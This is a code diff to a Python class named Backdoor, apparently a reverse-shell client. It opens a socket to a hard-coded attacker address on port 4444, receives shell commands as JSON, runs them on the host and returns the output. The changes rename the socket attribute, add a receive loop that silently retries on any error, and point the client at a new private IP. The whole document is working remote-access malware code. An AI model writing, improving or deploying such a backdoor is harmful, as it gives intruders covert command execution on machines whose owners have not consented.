@@ -3,9 +3,9 @@ import subprocess, sys, socket, json
 
 class Backdoor:
     def __init__(self,ip,port):
-        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         try:
-            self.s.connect((str(ip),port))
+            self.connection.connect((str(ip),port))
         except ConnectionRefusedError:
             sys.exit()
         
@@ -17,12 +17,19 @@ class Backdoor:
     
     def sendStream(self,data):
         jsData = json.dumps(data)
-        self.s.send(str(jsData).encode('utf-8'))
+        self.connection.send(str(jsData).encode('utf-8'))
 
 
     def recvStream(self):
-        jsData = self.s.recv(1024)
-        return json.loads(jsData)
+        jsData = ''
+        while True:
+            try:
+                recvData = self.connection.recv(1024)
+                recvData = recvData.decode()
+                jsData = jsData + recvData
+                return json.loads(jsData)
+            except Exception as e:
+                continue
 
 
     def run(self):
@@ -46,10 +53,11 @@ class Backdoor:
                 self.sendStream('Subprocess Error, shell command not accepted by target')
 
 
-backdoor = Backdoor('10.211.55.5',4444)
+
 
 
 try:
+    backdoor = Backdoor('192.168.241.133',4444)
     backdoor.run()
 except KeyboardInterrupt:
     sys.exit()
